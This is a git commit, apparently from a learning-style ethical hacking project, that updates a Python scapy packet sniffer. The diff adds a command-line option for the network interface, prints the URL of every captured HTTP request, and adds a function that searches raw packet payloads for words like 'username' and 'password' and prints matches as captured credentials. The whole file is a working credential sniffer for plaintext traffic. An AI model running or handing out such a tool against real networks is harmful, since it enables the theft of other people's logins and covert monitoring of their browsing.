ddfe9f7ec605fa419f61cb17d3ed77118ef4eb6f
SAMi-Rn <sami_roudgarian@yahoo.com>
2024-04-02 18:41:35 -0700

    Http request URL added

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -1,6 +1,16 @@
 # works on linux
 import scapy.all as scapy
 from scapy.layers.http import HTTPRequest, HTTPResponse
+import argparse
+
+
+def get_arguments():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-i", "--interface", dest="interface", help="Interface to sniff packets")
+    options = parser.parse_args()
+    if not options.interface:
+        parser.error("[-] Please specify an interface, use --help for more info.")
+    return options
 
 
 def sniff(interface):
@@ -9,16 +19,23 @@ def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_packet)
 
 
+def login_info(packet):
+    if packet.haslayer(scapy.Raw):
+        load = str(packet[scapy.Raw].load)
+        keywords = ["username", "user", "login", "password", "pass"]
+        for keyword in keywords:
+            if keyword in load:
+                return load
+
+
 def process_packet(packet):
     if packet.haslayer(HTTPRequest):
-        if packet.haslayer(scapy.Raw):
-            load = str(packet[scapy.Raw].load)
-            print(load)
-            words = ["uname", "pass"]
-            for word in words:
-                if word in load:
-                    print("[+] Possible username/password found: " + load)
-                    break
-        
+        url = packet[HTTPRequest].Host + packet[HTTPRequest].Path
+        print("[+] HTTP Request: " + str(url))
+        login = login_info(packet)
+        if login:
+            print("\n[+] Username/password: " + login + "\n")
 
-sniff("wlp1s0")
+
+options = get_arguments()
+sniff(options.interface)
